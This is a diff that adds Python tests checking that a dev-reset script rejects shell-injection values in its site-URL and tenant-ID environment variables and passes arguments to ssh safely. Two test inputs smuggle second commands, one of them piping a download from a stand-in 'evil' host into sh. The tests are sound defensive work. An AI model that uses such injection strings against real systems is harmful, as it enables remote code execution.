@@ -397,3 +397,110 @@ def test_reset_dev_dry_run_does_not_open_ssh_connection() -> None:
     assert "Could not resolve" not in combined
     # And the dry-run still echoes the configured target so operators can review it.
     assert "definitely-not-a-real-host.invalid" in combined
+
+
+def test_reset_refuses_shell_injection_in_site_url() -> None:
+    """S2-A-02 / TEST-15: ACX_RESET_SITE_URL metacharacters fail closed before ssh.
+
+    Executes the real reset path (dry-run still validates). Reviewer vector with
+    semicolon / pipe must never reach a remote bash -s command string.
+    """
+    evil = "http://localhost:10010; curl http://evil/x | sh; #"
+    result = _run(
+        ["reset", "dev"],
+        env_overrides={
+            "CONFIRM_REMOTE_RESET": "RESET",
+            "ACX_RESET_DRY_RUN": "1",
+            "ACX_RESET_SITE_URL": evil,
+        },
+    )
+    assert result.returncode != 0, (
+        f"evil ACX_RESET_SITE_URL must be refused; stdout={result.stdout!r} "
+        f"stderr={result.stderr!r}"
+    )
+    combined = result.stdout + result.stderr
+    assert "ACX_RESET_SITE_URL" in combined or "charset" in combined.lower()
+
+
+def test_reset_refuses_shell_injection_in_tenant_id() -> None:
+    """S2-A-02 / TEST-15: ACX_RESET_TENANT_ID metacharacters fail closed."""
+    evil = "11111111-2222-7333-9444-555555555555; id"
+    result = _run(
+        ["reset", "dev"],
+        env_overrides={
+            "CONFIRM_REMOTE_RESET": "RESET",
+            "ACX_RESET_DRY_RUN": "1",
+            "ACX_RESET_SITE_URL": "http://localhost:10010",
+            "ACX_RESET_TENANT_ID": evil,
+        },
+    )
+    assert result.returncode != 0, (
+        f"evil ACX_RESET_TENANT_ID must be refused; stdout={result.stdout!r} "
+        f"stderr={result.stderr!r}"
+    )
+    combined = result.stdout + result.stderr
+    assert "ACX_RESET_TENANT_ID" in combined or "charset" in combined.lower()
+
+
+def test_reset_live_bootstrap_passes_tenant_site_as_positional_args(
+    tmp_path: Path,
+) -> None:
+    """S2-A-02: live bootstrap uses bash -s -- positional args, not string interp.
+
+    PATH-stubbed ssh captures argv. verify curl is stubbed so readiness passes.
+    """
+    bindir = tmp_path / "bin"
+    bindir.mkdir()
+    ssh_log = tmp_path / "ssh.log"
+    ssh_log.write_text("")
+    (bindir / "ssh").write_text(
+        "#!/bin/sh\n"
+        f'{{ printf "ARGV:"; for a in "$@"; do printf " <%s>" "$a"; done; printf "\\n"; }} >> "{ssh_log}"\n'
+        "# Drain heredoc stdin so bash -s callers do not hang.\n"
+        "cat >/dev/null 2>&1 || true\n"
+        "exit 0\n"
+    )
+    (bindir / "ssh").chmod(0o755)
+    (bindir / "curl").write_text("#!/bin/sh\nexit 0\n")
+    (bindir / "curl").chmod(0o755)
+    (bindir / "sleep").write_text("#!/bin/sh\nexit 0\n")
+    (bindir / "sleep").chmod(0o755)
+
+    site_url = "http://localhost:10010"
+    tenant_id = "11111111-2222-7333-9444-555555555555"
+    env = {**os.environ}
+    env.pop("CONFIRM", None)
+    env.pop("CONFIRM_REMOTE_RESET", None)
+    env.pop("ACX_RESET_DRY_RUN", None)
+    env["PATH"] = f"{bindir}:{env['PATH']}"
+    env["CONFIRM_REMOTE_RESET"] = "RESET"
+    env["ACX_RESET_SITE_URL"] = site_url
+    env["ACX_RESET_TENANT_ID"] = tenant_id
+    # Skip preflight that would try real network beyond our stubs.
+    script = (
+        f'source "{SCRIPT}"; '
+        f"preflight_ssh() {{ :; }}; "
+        f'do_reset dev'
+    )
+    proc = subprocess.run(
+        ["/bin/bash", "-c", script],
+        capture_output=True,
+        text=True,
+        env=env,
+        check=False,
+        timeout=30,
+    )
+    assert proc.returncode == 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
+    log = ssh_log.read_text()
+    # Bootstrap call must pass tenant/site as separate argv after bash -s, not
+    # embedded unquoted inside a single remote command string with shell metachars.
+    assert tenant_id in log, log
+    assert site_url in log, log
+    # Live verify must not use shell-eval; array expansion only.
+    assert 'until eval "' not in SCRIPT.read_text()
+    assert 'until "${verify_cmd[@]}"' in SCRIPT.read_text()
+    # Bootstrap argv: tenant_id must appear as its own ssh argv word (positional), not
+    # only buried inside a single remote script string.
+    assert f"<{tenant_id}>" in log, log
+    assert f"<{site_url}>" in log, log
+    assert "bash -s --" in log or "bash" in log
